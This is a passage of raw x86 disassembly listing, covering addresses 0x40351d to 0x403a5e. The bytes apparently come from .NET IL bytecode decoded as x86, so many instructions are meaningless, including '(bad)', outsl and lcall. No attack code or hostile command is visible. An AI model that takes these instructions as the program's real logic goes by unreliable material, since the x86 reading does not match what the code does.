  40351d:	68 08 5a 1f 48       	push   $0x481f5a08
  403522:	58                   	pop    %eax
  403523:	6f                   	outsl  %ds:(%esi),(%dx)
  403524:	8a 00                	mov    (%eax),%al
  403526:	00 0a                	add    %cl,(%edx)
  403528:	02 7b 30             	add    0x30(%ebx),%bh
  40352b:	00 00                	add    %al,(%eax)
  40352d:	04 08                	add    $0x8,%al
  40352f:	6f                   	outsl  %ds:(%esi),(%dx)
  403530:	86 00                	xchg   %al,(%eax)
  403532:	00 0a                	add    %cl,(%edx)
  403534:	7b 35                	jnp    0x40356b
  403536:	00 00                	add    %al,(%eax)
  403538:	04 1f                	add    $0x1f,%al
  40353a:	68 08 5a 1f 58       	push   $0x581f5a08
  40353f:	58                   	pop    %eax
  403540:	6f                   	outsl  %ds:(%esi),(%dx)
  403541:	8a 00                	mov    (%eax),%al
  403543:	00 0a                	add    %cl,(%edx)
  403545:	08 17                	or     %dl,(%edi)
  403547:	58                   	pop    %eax
  403548:	0c 08                	or     $0x8,%al
  40354a:	02 7b 30             	add    0x30(%ebx),%bh
  40354d:	00 00                	add    %al,(%eax)
  40354f:	04 6f                	add    $0x6f,%al
  403551:	92                   	xchg   %eax,%edx
  403552:	00 00                	add    %al,(%eax)
  403554:	0a 3f                	or     (%edi),%bh
  403556:	5a                   	pop    %edx
  403557:	ff                   	(bad)
  403558:	ff                   	(bad)
  403559:	ff 1f                	lcall  *(%edi)
  40355b:	68 02 7b 30 00       	push   $0x307b02
  403560:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403563:	92                   	xchg   %eax,%edx
  403564:	00 00                	add    %al,(%eax)
  403566:	0a 5a 1f             	or     0x1f(%edx),%bl
  403569:	2b 58 02             	sub    0x2(%eax),%ebx
  40356c:	28 34 00             	sub    %dh,(%eax,%eax,1)
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	6f                   	outsl  %ds:(%esi),(%dx)
  403572:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  403577:	0a 12                	or     (%edx),%dl
  403579:	0a 28                	or     (%eax),%ch
  40357b:	99                   	cltd
  40357c:	00 00                	add    %al,(%eax)
  40357e:	0a 30                	or     (%eax),%dh
  403580:	5d                   	pop    %ebp
  403581:	02 1f                	add    (%edi),%bl
  403583:	68 02 7b 30 00       	push   $0x307b02
  403588:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40358b:	92                   	xchg   %eax,%edx
  40358c:	00 00                	add    %al,(%eax)
  40358e:	0a 5a 1f             	or     0x1f(%edx),%bl
  403591:	2b 58 28             	sub    0x28(%eax),%ebx
  403594:	5a                   	pop    %edx
  403595:	00 00                	add    %al,(%eax)
  403597:	0a 02                	or     (%edx),%al
  403599:	02 28                	add    (%eax),%ch
  40359b:	34 00                	xor    $0x0,%al
  40359d:	00 0a                	add    %cl,(%edx)
  40359f:	6f                   	outsl  %ds:(%esi),(%dx)
  4035a0:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4035a5:	0b 12                	or     (%edx),%edx
  4035a7:	0b 28                	or     (%eax),%ebp
  4035a9:	36 00 00             	add    %al,%ss:(%eax)
  4035ac:	0a 02                	or     (%edx),%al
  4035ae:	28 58 00             	sub    %bl,0x0(%eax)
  4035b1:	00 0a                	add    %cl,(%edx)
  4035b3:	59                   	pop    %ecx
  4035b4:	18 5b 02             	sbb    %bl,0x2(%ebx)
  4035b7:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4035ba:	00 0a                	add    %cl,(%edx)
  4035bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4035bd:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4035c2:	0c 12                	or     $0x12,%al
  4035c4:	0c 28                	or     $0x28,%al
  4035c6:	99                   	cltd
  4035c7:	00 00                	add    %al,(%eax)
  4035c9:	0a 02                	or     (%edx),%al
  4035cb:	28 59 00             	sub    %bl,0x0(%ecx)
  4035ce:	00 0a                	add    %cl,(%edx)
  4035d0:	59                   	pop    %ecx
  4035d1:	18 5b 73             	sbb    %bl,0x73(%ebx)
  4035d4:	32 00                	xor    (%eax),%al
  4035d6:	00 0a                	add    %cl,(%edx)
  4035d8:	28 9a 00 00 0a 2a    	sub    %bl,0x2a0a0000(%edx)
  4035de:	02 02                	add    (%edx),%al
  4035e0:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4035e3:	00 0a                	add    %cl,(%edx)
  4035e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4035e6:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4035eb:	0d 12 0d 28 99       	or     $0x99280d12,%eax
  4035f0:	00 00                	add    %al,(%eax)
  4035f2:	0a 28                	or     (%eax),%ch
  4035f4:	5a                   	pop    %edx
  4035f5:	00 00                	add    %al,(%eax)
  4035f7:	0a 02                	or     (%edx),%al
  4035f9:	02 28                	add    (%eax),%ch
  4035fb:	34 00                	xor    $0x0,%al
  4035fd:	00 0a                	add    %cl,(%edx)
  4035ff:	6f                   	outsl  %ds:(%esi),(%dx)
  403600:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  403605:	0e                   	push   %cs
  403606:	12 0e                	adc    (%esi),%cl
  403608:	28 36                	sub    %dh,(%esi)
  40360a:	00 00                	add    %al,(%eax)
  40360c:	0a 02                	or     (%edx),%al
  40360e:	28 58 00             	sub    %bl,0x0(%eax)
  403611:	00 0a                	add    %cl,(%edx)
  403613:	59                   	pop    %ecx
  403614:	18 5b 16             	sbb    %bl,0x16(%ebx)
  403617:	73 32                	jae    0x40364b
  403619:	00 00                	add    %al,(%eax)
  40361b:	0a 28                	or     (%eax),%ch
  40361d:	9a 00 00 0a 2a 06 16 	lcall  $0x1606,$0x2a0a0000
  403624:	3c e1                	cmp    $0xe1,%al
  403626:	02 00                	add    (%eax),%al
  403628:	00 12                	add    %dl,(%edx)
  40362a:	03 fe                	add    %esi,%edi
  40362c:	15 0d 00 00 02       	adc    $0x200000d,%eax
  403631:	12 03                	adc    (%ebx),%al
  403633:	03 6f 93             	add    -0x6d(%edi),%ebp
  403636:	00 00                	add    %al,(%eax)
  403638:	0a 7d 36             	or     0x36(%ebp),%bh
  40363b:	00 00                	add    %al,(%eax)
  40363d:	04 12                	add    $0x12,%al
  40363f:	03 03                	add    (%ebx),%eax
  403641:	6f                   	outsl  %ds:(%esi),(%dx)
  403642:	9b                   	fwait
  403643:	00 00                	add    %al,(%eax)
  403645:	0a 7d 37             	or     0x37(%ebp),%bh
  403648:	00 00                	add    %al,(%eax)
  40364a:	04 12                	add    $0x12,%al
  40364c:	03 16                	add    (%esi),%edx
  40364e:	7d 38                	jge    0x403688
  403650:	00 00                	add    %al,(%eax)
  403652:	04 15                	add    $0x15,%al
  403654:	13 04 15 13 05 12 03 	adc    0x3120513(,%edx,1),%eax
  40365b:	7b 37                	jnp    0x403694
  40365d:	00 00                	add    %al,(%eax)
  40365f:	04 16                	add    $0x16,%al
  403661:	32 3b                	xor    (%ebx),%bh
  403663:	16                   	push   %ss
  403664:	13 06                	adc    (%esi),%eax
  403666:	2b 27                	sub    (%edi),%esp
  403668:	02 7b 30             	add    0x30(%ebx),%bh
  40366b:	00 00                	add    %al,(%eax)
  40366d:	04 11                	add    $0x11,%al
  40366f:	06                   	push   %es
  403670:	6f                   	outsl  %ds:(%esi),(%dx)
  403671:	86 00                	xchg   %al,(%eax)
  403673:	00 0a                	add    %cl,(%edx)
  403675:	7b 36                	jnp    0x4036ad
  403677:	00 00                	add    %al,(%eax)
  403679:	04 12                	add    $0x12,%al
  40367b:	03 7b 37             	add    0x37(%ebx),%edi
  40367e:	00 00                	add    %al,(%eax)
  403680:	04 33                	add    $0x33,%al
  403682:	06                   	push   %es
  403683:	11 06                	adc    %eax,(%esi)
  403685:	13 05 2b 15 11 06    	adc    0x611152b,%eax
  40368b:	17                   	pop    %ss
  40368c:	58                   	pop    %eax
  40368d:	13 06                	adc    (%esi),%eax
  40368f:	11 06                	adc    %eax,(%esi)
  403691:	02 7b 30             	add    0x30(%ebx),%bh
  403694:	00 00                	add    %al,(%eax)
  403696:	04 6f                	add    $0x6f,%al
  403698:	92                   	xchg   %eax,%edx
  403699:	00 00                	add    %al,(%eax)
  40369b:	0a 32                	or     (%edx),%dh
  40369d:	ca 11 05             	lret   $0x511
  4036a0:	16                   	push   %ss
  4036a1:	3f                   	aas
  4036a2:	8f 00                	pop    (%eax)
  4036a4:	00 00                	add    %al,(%eax)
  4036a6:	12 03                	adc    (%ebx),%al
  4036a8:	02 7b 30             	add    0x30(%ebx),%bh
  4036ab:	00 00                	add    %al,(%eax)
  4036ad:	04 11                	add    $0x11,%al
  4036af:	05 6f 86 00 00       	add    $0x866f,%eax
  4036b4:	0a 7b 38             	or     0x38(%ebx),%bh
  4036b7:	00 00                	add    %al,(%eax)
  4036b9:	04 17                	add    $0x17,%al
  4036bb:	58                   	pop    %eax
  4036bc:	7d 38                	jge    0x4036f6
  4036be:	00 00                	add    %al,(%eax)
  4036c0:	04 11                	add    $0x11,%al
  4036c2:	05 17 58 13 07       	add    $0x7135817,%eax
  4036c7:	2b 5d 02             	sub    0x2(%ebp),%ebx
  4036ca:	7b 30                	jnp    0x4036fc
  4036cc:	00 00                	add    %al,(%eax)
  4036ce:	04 11                	add    $0x11,%al
  4036d0:	07                   	pop    %es
  4036d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4036d2:	86 00                	xchg   %al,(%eax)
  4036d4:	00 0a                	add    %cl,(%edx)
  4036d6:	7b 38                	jnp    0x403710
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	04 12                	add    $0x12,%al
  4036dc:	03 7b 38             	add    0x38(%ebx),%edi
  4036df:	00 00                	add    %al,(%eax)
  4036e1:	04 32                	add    $0x32,%al
  4036e3:	36 02 7b 30          	add    %ss:0x30(%ebx),%bh
  4036e7:	00 00                	add    %al,(%eax)
  4036e9:	04 11                	add    $0x11,%al
  4036eb:	07                   	pop    %es
  4036ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4036ed:	86 00                	xchg   %al,(%eax)
  4036ef:	00 0a                	add    %cl,(%edx)
  4036f1:	7b 38                	jnp    0x40372b
  4036f3:	00 00                	add    %al,(%eax)
  4036f5:	04 12                	add    $0x12,%al
  4036f7:	03 7b 38             	add    0x38(%ebx),%edi
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	04 33                	add    $0x33,%al
  4036fe:	21 02                	and    %eax,(%edx)
  403700:	7b 30                	jnp    0x403732
  403702:	00 00                	add    %al,(%eax)
  403704:	04 11                	add    $0x11,%al
  403706:	07                   	pop    %es
  403707:	6f                   	outsl  %ds:(%esi),(%dx)
  403708:	86 00                	xchg   %al,(%eax)
  40370a:	00 0a                	add    %cl,(%edx)
  40370c:	7b 37                	jnp    0x403745
  40370e:	00 00                	add    %al,(%eax)
  403710:	04 12                	add    $0x12,%al
  403712:	03 7b 37             	add    0x37(%ebx),%edi
  403715:	00 00                	add    %al,(%eax)
  403717:	04 2e                	add    $0x2e,%al
  403719:	06                   	push   %es
  40371a:	11 07                	adc    %eax,(%edi)
  40371c:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40371f:	15 11 07 17 58       	adc    $0x58170711,%eax
  403724:	13 07                	adc    (%edi),%eax
  403726:	11 07                	adc    %eax,(%edi)
  403728:	02 7b 30             	add    0x30(%ebx),%bh
  40372b:	00 00                	add    %al,(%eax)
  40372d:	04 6f                	add    $0x6f,%al
  40372f:	92                   	xchg   %eax,%edx
  403730:	00 00                	add    %al,(%eax)
  403732:	0a 32                	or     (%edx),%dh
  403734:	94                   	xchg   %eax,%esp
  403735:	11 04 15 33 30 02 12 	adc    %eax,0x12023033(,%edx,1)
  40373c:	03 02                	add    (%edx),%eax
  40373e:	7b 30                	jnp    0x403770
  403740:	00 00                	add    %al,(%eax)
  403742:	04 6f                	add    $0x6f,%al
  403744:	92                   	xchg   %eax,%edx
  403745:	00 00                	add    %al,(%eax)
  403747:	0a 28                	or     (%eax),%ch
  403749:	32 00                	xor    (%eax),%al
  40374b:	00 06                	add    %al,(%esi)
  40374d:	02 7b 30             	add    0x30(%ebx),%bh
  403750:	00 00                	add    %al,(%eax)
  403752:	04 6f                	add    $0x6f,%al
  403754:	92                   	xchg   %eax,%edx
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 0a                	or     (%edx),%cl
  403759:	02 7b 30             	add    0x30(%ebx),%bh
  40375c:	00 00                	add    %al,(%eax)
  40375e:	04 09                	add    $0x9,%al
  403760:	6f                   	outsl  %ds:(%esi),(%dx)
  403761:	9c                   	pushf
  403762:	00 00                	add    %al,(%eax)
  403764:	0a 38                	or     (%eax),%bh
  403766:	d8 00                	fadds  (%eax)
  403768:	00 00                	add    %al,(%eax)
  40376a:	02 12                	add    (%edx),%dl
  40376c:	03 11                	add    (%ecx),%edx
  40376e:	04 28                	add    $0x28,%al
  403770:	32 00                	xor    (%eax),%al
  403772:	00 06                	add    %al,(%esi)
  403774:	11 04 0a             	adc    %eax,(%edx,%ecx,1)
  403777:	02 7b 30             	add    0x30(%ebx),%bh
  40377a:	00 00                	add    %al,(%eax)
  40377c:	04 11                	add    $0x11,%al
  40377e:	04 09                	add    $0x9,%al
  403780:	6f                   	outsl  %ds:(%esi),(%dx)
  403781:	9d                   	popf
  403782:	00 00                	add    %al,(%eax)
  403784:	0a 06                	or     (%esi),%al
  403786:	17                   	pop    %ss
  403787:	58                   	pop    %eax
  403788:	13 08                	adc    (%eax),%ecx
  40378a:	38 a1 00 00 00 02    	cmp    %ah,0x2000000(%ecx)
  403790:	7b 30                	jnp    0x4037c2
  403792:	00 00                	add    %al,(%eax)
  403794:	04 11                	add    $0x11,%al
  403796:	08 6f 86             	or     %ch,-0x7a(%edi)
  403799:	00 00                	add    %al,(%eax)
  40379b:	0a 7b 31             	or     0x31(%ebx),%bh
  40379e:	00 00                	add    %al,(%eax)
  4037a0:	04 1f                	add    $0x1f,%al
  4037a2:	68 11 08 5a 1f       	push   $0x1f5a0811
  4037a7:	0a 58 6f             	or     0x6f(%eax),%bl
  4037aa:	8a 00                	mov    (%eax),%al
  4037ac:	00 0a                	add    %cl,(%edx)
  4037ae:	02 7b 30             	add    0x30(%ebx),%bh
  4037b1:	00 00                	add    %al,(%eax)
  4037b3:	04 11                	add    $0x11,%al
  4037b5:	08 6f 86             	or     %ch,-0x7a(%edi)
  4037b8:	00 00                	add    %al,(%eax)
  4037ba:	0a 7b 32             	or     0x32(%ebx),%bh
  4037bd:	00 00                	add    %al,(%eax)
  4037bf:	04 1f                	add    $0x1f,%al
  4037c1:	68 11 08 5a 1f       	push   $0x1f5a0811
  4037c6:	1a 58 6f             	sbb    0x6f(%eax),%bl
  4037c9:	8a 00                	mov    (%eax),%al
  4037cb:	00 0a                	add    %cl,(%edx)
  4037cd:	02 7b 30             	add    0x30(%ebx),%bh
  4037d0:	00 00                	add    %al,(%eax)
  4037d2:	04 11                	add    $0x11,%al
  4037d4:	08 6f 86             	or     %ch,-0x7a(%edi)
  4037d7:	00 00                	add    %al,(%eax)
  4037d9:	0a 7b 33             	or     0x33(%ebx),%bh
  4037dc:	00 00                	add    %al,(%eax)
  4037de:	04 1f                	add    $0x1f,%al
  4037e0:	68 11 08 5a 1f       	push   $0x1f5a0811
  4037e5:	2f                   	das
  4037e6:	58                   	pop    %eax
  4037e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4037e8:	8a 00                	mov    (%eax),%al
  4037ea:	00 0a                	add    %cl,(%edx)
  4037ec:	02 7b 30             	add    0x30(%ebx),%bh
  4037ef:	00 00                	add    %al,(%eax)
  4037f1:	04 11                	add    $0x11,%al
  4037f3:	08 6f 86             	or     %ch,-0x7a(%edi)
  4037f6:	00 00                	add    %al,(%eax)
  4037f8:	0a 7b 34             	or     0x34(%ebx),%bh
  4037fb:	00 00                	add    %al,(%eax)
  4037fd:	04 1f                	add    $0x1f,%al
  4037ff:	68 11 08 5a 1f       	push   $0x1f5a0811
  403804:	48                   	dec    %eax
  403805:	58                   	pop    %eax
  403806:	6f                   	outsl  %ds:(%esi),(%dx)
  403807:	8a 00                	mov    (%eax),%al
  403809:	00 0a                	add    %cl,(%edx)
  40380b:	02 7b 30             	add    0x30(%ebx),%bh
  40380e:	00 00                	add    %al,(%eax)
  403810:	04 11                	add    $0x11,%al
  403812:	08 6f 86             	or     %ch,-0x7a(%edi)
  403815:	00 00                	add    %al,(%eax)
  403817:	0a 7b 35             	or     0x35(%ebx),%bh
  40381a:	00 00                	add    %al,(%eax)
  40381c:	04 1f                	add    $0x1f,%al
  40381e:	68 11 08 5a 1f       	push   $0x1f5a0811
  403823:	58                   	pop    %eax
  403824:	58                   	pop    %eax
  403825:	6f                   	outsl  %ds:(%esi),(%dx)
  403826:	8a 00                	mov    (%eax),%al
  403828:	00 0a                	add    %cl,(%edx)
  40382a:	11 08                	adc    %ecx,(%eax)
  40382c:	17                   	pop    %ss
  40382d:	58                   	pop    %eax
  40382e:	13 08                	adc    (%eax),%ecx
  403830:	11 08                	adc    %ecx,(%eax)
  403832:	02 7b 30             	add    0x30(%ebx),%bh
  403835:	00 00                	add    %al,(%eax)
  403837:	04 6f                	add    $0x6f,%al
  403839:	92                   	xchg   %eax,%edx
  40383a:	00 00                	add    %al,(%eax)
  40383c:	0a 3f                	or     (%edi),%bh
  40383e:	4d                   	dec    %ebp
  40383f:	ff                   	(bad)
  403840:	ff                   	(bad)
  403841:	ff 1f                	lcall  *(%edi)
  403843:	68 02 7b 30 00       	push   $0x307b02
  403848:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40384b:	92                   	xchg   %eax,%edx
  40384c:	00 00                	add    %al,(%eax)
  40384e:	0a 5a 1f             	or     0x1f(%edx),%bl
  403851:	2b 58 02             	sub    0x2(%eax),%ebx
  403854:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403857:	00 0a                	add    %cl,(%edx)
  403859:	6f                   	outsl  %ds:(%esi),(%dx)
  40385a:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  40385f:	0f 12 0f             	movlps (%edi),%xmm1
  403862:	28 99 00 00 0a 30    	sub    %bl,0x300a0000(%ecx)
  403868:	5e                   	pop    %esi
  403869:	02 1f                	add    (%edi),%bl
  40386b:	68 02 7b 30 00       	push   $0x307b02
  403870:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403873:	92                   	xchg   %eax,%edx
  403874:	00 00                	add    %al,(%eax)
  403876:	0a 5a 1f             	or     0x1f(%edx),%bl
  403879:	2b 58 28             	sub    0x28(%eax),%ebx
  40387c:	5a                   	pop    %edx
  40387d:	00 00                	add    %al,(%eax)
  40387f:	0a 02                	or     (%edx),%al
  403881:	02 28                	add    (%eax),%ch
  403883:	34 00                	xor    $0x0,%al
  403885:	00 0a                	add    %cl,(%edx)
  403887:	6f                   	outsl  %ds:(%esi),(%dx)
  403888:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  40388d:	10 12                	adc    %dl,(%edx)
  40388f:	10 28                	adc    %ch,(%eax)
  403891:	36 00 00             	add    %al,%ss:(%eax)
  403894:	0a 02                	or     (%edx),%al
  403896:	28 58 00             	sub    %bl,0x0(%eax)
  403899:	00 0a                	add    %cl,(%edx)
  40389b:	59                   	pop    %ecx
  40389c:	18 5b 02             	sbb    %bl,0x2(%ebx)
  40389f:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4038a2:	00 0a                	add    %cl,(%edx)
  4038a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038a5:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4038aa:	11 12                	adc    %edx,(%edx)
  4038ac:	11 28                	adc    %ebp,(%eax)
  4038ae:	99                   	cltd
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	0a 02                	or     (%edx),%al
  4038b3:	28 59 00             	sub    %bl,0x0(%ecx)
  4038b6:	00 0a                	add    %cl,(%edx)
  4038b8:	59                   	pop    %ecx
  4038b9:	18 5b 73             	sbb    %bl,0x73(%ebx)
  4038bc:	32 00                	xor    (%eax),%al
  4038be:	00 0a                	add    %cl,(%edx)
  4038c0:	28 9a 00 00 0a 2b    	sub    %bl,0x2b0a0000(%edx)
  4038c6:	43                   	inc    %ebx
  4038c7:	02 02                	add    (%edx),%al
  4038c9:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4038cc:	00 0a                	add    %cl,(%edx)
  4038ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4038cf:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4038d4:	12 12                	adc    (%edx),%dl
  4038d6:	12 28                	adc    (%eax),%ch
  4038d8:	99                   	cltd
  4038d9:	00 00                	add    %al,(%eax)
  4038db:	0a 28                	or     (%eax),%ch
  4038dd:	5a                   	pop    %edx
  4038de:	00 00                	add    %al,(%eax)
  4038e0:	0a 02                	or     (%edx),%al
  4038e2:	02 28                	add    (%eax),%ch
  4038e4:	34 00                	xor    $0x0,%al
  4038e6:	00 0a                	add    %cl,(%edx)
  4038e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e9:	35 00 00 0a 13       	xor    $0x130a0000,%eax
  4038ee:	13 12                	adc    (%edx),%edx
  4038f0:	13 28                	adc    (%eax),%ebp
  4038f2:	36 00 00             	add    %al,%ss:(%eax)
  4038f5:	0a 02                	or     (%edx),%al
  4038f7:	28 58 00             	sub    %bl,0x0(%eax)
  4038fa:	00 0a                	add    %cl,(%edx)
  4038fc:	59                   	pop    %ecx
  4038fd:	18 5b 16             	sbb    %bl,0x16(%ebx)
  403900:	73 32                	jae    0x403934
  403902:	00 00                	add    %al,(%eax)
  403904:	0a 28                	or     (%eax),%ch
  403906:	9a 00 00 0a 03 6f 9e 	lcall  $0x9e6f,$0x30a0000
  40390d:	00 00                	add    %al,(%eax)
  40390f:	0a 28                	or     (%eax),%ch
  403911:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403916:	1e                   	push   %ds
  403917:	02 7b 30             	add    0x30(%ebx),%bh
  40391a:	00 00                	add    %al,(%eax)
  40391c:	04 06                	add    $0x6,%al
  40391e:	6f                   	outsl  %ds:(%esi),(%dx)
  40391f:	86 00                	xchg   %al,(%eax)
  403921:	00 0a                	add    %cl,(%edx)
  403923:	7b 31                	jnp    0x403956
  403925:	00 00                	add    %al,(%eax)
  403927:	04 03                	add    $0x3,%al
  403929:	6f                   	outsl  %ds:(%esi),(%dx)
  40392a:	9e                   	sahf
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 6f 31             	or     0x31(%edi),%ch
  403930:	00 00                	add    %al,(%eax)
  403932:	0a 2b                	or     (%ebx),%ch
  403934:	1b 02                	sbb    (%edx),%eax
  403936:	7b 30                	jnp    0x403968
  403938:	00 00                	add    %al,(%eax)
  40393a:	04 06                	add    $0x6,%al
  40393c:	6f                   	outsl  %ds:(%esi),(%dx)
  40393d:	86 00                	xchg   %al,(%eax)
  40393f:	00 0a                	add    %cl,(%edx)
  403941:	7b 31                	jnp    0x403974
  403943:	00 00                	add    %al,(%eax)
  403945:	04 72                	add    $0x72,%al
  403947:	01 00                	add    %eax,(%eax)
  403949:	00 70 6f             	add    %dh,0x6f(%eax)
  40394c:	31 00                	xor    %eax,(%eax)
  40394e:	00 0a                	add    %cl,(%edx)
  403950:	03 6f 9f             	add    -0x61(%edi),%ebp
  403953:	00 00                	add    %al,(%eax)
  403955:	0a 28                	or     (%eax),%ch
  403957:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  40395c:	1e                   	push   %ds
  40395d:	02 7b 30             	add    0x30(%ebx),%bh
  403960:	00 00                	add    %al,(%eax)
  403962:	04 06                	add    $0x6,%al
  403964:	6f                   	outsl  %ds:(%esi),(%dx)
  403965:	86 00                	xchg   %al,(%eax)
  403967:	00 0a                	add    %cl,(%edx)
  403969:	7b 32                	jnp    0x40399d
  40396b:	00 00                	add    %al,(%eax)
  40396d:	04 03                	add    $0x3,%al
  40396f:	6f                   	outsl  %ds:(%esi),(%dx)
  403970:	9f                   	lahf
  403971:	00 00                	add    %al,(%eax)
  403973:	0a 6f 31             	or     0x31(%edi),%ch
  403976:	00 00                	add    %al,(%eax)
  403978:	0a 2b                	or     (%ebx),%ch
  40397a:	1b 02                	sbb    (%edx),%eax
  40397c:	7b 30                	jnp    0x4039ae
  40397e:	00 00                	add    %al,(%eax)
  403980:	04 06                	add    $0x6,%al
  403982:	6f                   	outsl  %ds:(%esi),(%dx)
  403983:	86 00                	xchg   %al,(%eax)
  403985:	00 0a                	add    %cl,(%edx)
  403987:	7b 32                	jnp    0x4039bb
  403989:	00 00                	add    %al,(%eax)
  40398b:	04 72                	add    $0x72,%al
  40398d:	01 00                	add    %eax,(%eax)
  40398f:	00 70 6f             	add    %dh,0x6f(%eax)
  403992:	31 00                	xor    %eax,(%eax)
  403994:	00 0a                	add    %cl,(%edx)
  403996:	03 6f a0             	add    -0x60(%edi),%ebp
  403999:	00 00                	add    %al,(%eax)
  40399b:	0a 16                	or     (%esi),%dl
  40399d:	32 78 03             	xor    0x3(%eax),%bh
  4039a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039a1:	a0 00 00 0a 1f       	mov    0x1f0a0000,%al
  4039a6:	64 30 6e 03          	xor    %ch,%fs:0x3(%esi)
  4039aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4039ab:	a0 00 00 0a 1f       	mov    0x1f0a0000,%al
  4039b0:	64 2f                	fs das
  4039b2:	20 02                	and    %al,(%edx)
  4039b4:	7b 30                	jnp    0x4039e6
  4039b6:	00 00                	add    %al,(%eax)
  4039b8:	04 06                	add    $0x6,%al
  4039ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4039bb:	86 00                	xchg   %al,(%eax)
  4039bd:	00 0a                	add    %cl,(%edx)
  4039bf:	7b 33                	jnp    0x4039f4
  4039c1:	00 00                	add    %al,(%eax)
  4039c3:	04 03                	add    $0x3,%al
  4039c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c6:	a0 00 00 0a 17       	mov    0x170a0000,%al
  4039cb:	58                   	pop    %eax
  4039cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4039cd:	87 00                	xchg   %eax,(%eax)
  4039cf:	00 0a                	add    %cl,(%edx)
  4039d1:	2b 18                	sub    (%eax),%ebx
  4039d3:	02 7b 30             	add    0x30(%ebx),%bh
  4039d6:	00 00                	add    %al,(%eax)
  4039d8:	04 06                	add    $0x6,%al
  4039da:	6f                   	outsl  %ds:(%esi),(%dx)
  4039db:	86 00                	xchg   %al,(%eax)
  4039dd:	00 0a                	add    %cl,(%edx)
  4039df:	7b 33                	jnp    0x403a14
  4039e1:	00 00                	add    %al,(%eax)
  4039e3:	04 1f                	add    $0x1f,%al
  4039e5:	63 6f 87             	arpl   %ebp,-0x79(%edi)
  4039e8:	00 00                	add    %al,(%eax)
  4039ea:	0a 02                	or     (%edx),%al
  4039ec:	7b 30                	jnp    0x403a1e
  4039ee:	00 00                	add    %al,(%eax)
  4039f0:	04 06                	add    $0x6,%al
  4039f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f3:	86 00                	xchg   %al,(%eax)
  4039f5:	00 0a                	add    %cl,(%edx)
  4039f7:	7b 33                	jnp    0x403a2c
  4039f9:	00 00                	add    %al,(%eax)
  4039fb:	04 17                	add    $0x17,%al
  4039fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4039fe:	1b 00                	sbb    (%eax),%eax
  403a00:	00 0a                	add    %cl,(%edx)
  403a02:	02 06                	add    (%esi),%al
  403a04:	7d 2d                	jge    0x403a33
  403a06:	00 00                	add    %al,(%eax)
  403a08:	04 02                	add    $0x2,%al
  403a0a:	03 6f a0             	add    -0x60(%edi),%ebp
  403a0d:	00 00                	add    %al,(%eax)
  403a0f:	0a 7d 2e             	or     0x2e(%ebp),%bh
  403a12:	00 00                	add    %al,(%eax)
  403a14:	04 2b                	add    $0x2b,%al
  403a16:	6f                   	outsl  %ds:(%esi),(%dx)
  403a17:	03 6f a0             	add    -0x60(%edi),%ebp
  403a1a:	00 00                	add    %al,(%eax)
  403a1c:	0a 1f                	or     (%edi),%bl
  403a1e:	64 31 3e             	xor    %edi,%fs:(%esi)
  403a21:	02 7b 30             	add    0x30(%ebx),%bh
  403a24:	00 00                	add    %al,(%eax)
  403a26:	04 06                	add    $0x6,%al
  403a28:	6f                   	outsl  %ds:(%esi),(%dx)
  403a29:	86 00                	xchg   %al,(%eax)
  403a2b:	00 0a                	add    %cl,(%edx)
  403a2d:	7b 33                	jnp    0x403a62
  403a2f:	00 00                	add    %al,(%eax)
  403a31:	04 16                	add    $0x16,%al
  403a33:	6f                   	outsl  %ds:(%esi),(%dx)
  403a34:	87 00                	xchg   %eax,(%eax)
  403a36:	00 0a                	add    %cl,(%edx)
  403a38:	02 7b 30             	add    0x30(%ebx),%bh
  403a3b:	00 00                	add    %al,(%eax)
  403a3d:	04 06                	add    $0x6,%al
  403a3f:	6f                   	outsl  %ds:(%esi),(%dx)
  403a40:	86 00                	xchg   %al,(%eax)
  403a42:	00 0a                	add    %cl,(%edx)
  403a44:	7b 33                	jnp    0x403a79
  403a46:	00 00                	add    %al,(%eax)
  403a48:	04 17                	add    $0x17,%al
  403a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a4b:	1b 00                	sbb    (%eax),%eax
  403a4d:	00 0a                	add    %cl,(%edx)
  403a4f:	02 06                	add    (%esi),%al
  403a51:	7d 2d                	jge    0x403a80
  403a53:	00 00                	add    %al,(%eax)
  403a55:	04 02                	add    $0x2,%al
  403a57:	16                   	push   %ss
  403a58:	7d 2e                	jge    0x403a88
  403a5a:	00 00                	add    %al,(%eax)
  403a5c:	04 2b                	add    $0x2b,%al
  403a5e:	27                   	daa
